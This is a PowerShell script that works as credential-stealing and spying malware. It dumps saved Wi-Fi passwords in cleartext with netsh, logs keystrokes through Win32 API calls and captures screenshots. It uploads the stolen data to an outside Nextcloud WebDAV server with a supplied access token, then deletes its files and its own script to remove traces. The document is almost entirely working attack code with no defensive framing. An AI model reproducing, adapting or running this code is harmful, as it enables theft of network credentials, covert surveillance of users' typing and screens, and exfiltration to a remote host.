param (
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[string]$AccessToken
)

function Nextcloud-Upload {

[CmdletBinding()]
param ($SourceFilePath, $AccessToken) 

# Set security protocol to TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Define the File to Upload
$file = $SourceFilePath

# Define authentication information
$nextcloudUrl = "https://wim.nl.tab.digital/"

# Retrieve file object
$fileObject = Get-Item $file

# Define headers for HTTP request
$headers = @{
    "Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
    "X-Requested-With"="XMLHttpRequest";
}

# Construct URL for webdav endpoint
$webdavUrl = "$($nextcloudUrl)/public.php/webdav/$($fileObject.Name)"

# Upload file to Nextcloud server
Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
}


# Create new directory to store wlan network profile dumps
$p = "C:\wipass"
mkdir $p
cd $p

# Get all saved wifi password
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File "$env:computername-wificapture.txt" -Append -InputObject $a
}

# Upload to Nextcloud server
Nextcloud-Upload -SourceFilePath "$env:computername-wificapture.txt" -AccessToken $AccessToken

# Clear tracks
rm *.xml
rm *.txt
cd ..
rm wipass

#requires -Version 2
function Start-KeyLogger($Path="$env:temp\keylogger.txt")
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
    
	$iteration = 1
	
    # create endless loop. When user presses CTRL+C, finally-block
    # executes and shows the collected key presses
    while ($iteration -lt 10) {
	  
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
          
		  Write-Host "Key pressed $mychar and iteration n. $iteration"
	      $iteration = $iteration + 1
		  
          if ($success) 
          {
            # add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {
    Write-Host "Running script"
  }
}

# records all key presses until script is aborted by pressing CTRL+C
# will then open the file with collected key codes
Start-KeyLogger

$i = 0
while($i -lt 3){

  Add-Type -AssemblyName System.Windows.Forms,System.Drawing

  $screens = [Windows.Forms.Screen]::AllScreens

  $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
  $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
  $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
  $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

  $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
  $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
  $graphics = [Drawing.Graphics]::FromImage($bmp)

  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

  $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png")
  $graphics.Dispose()
  $bmp.Dispose()
  
  $i++
  start-sleep -Seconds 5
  $sourcePath = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png"
  Nextcloud-Upload -SourceFilePath $sourcePath -AccessToken $AccessToken
}


# Remove all traces of keylogger, screen grabber and powershell script
$paths =  "$env:APPDATA\sg.ps1", "$env:temp\keylogger.txt", "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png"
foreach($filePath in $paths) {
	
    if (Test-Path $filePath) {
        Write-Host "Path removed: $filePath" 
        Remove-Item $filePath -verbose
    } else {
        Write-Host "Path $filePath doesn't exits"
    }
}





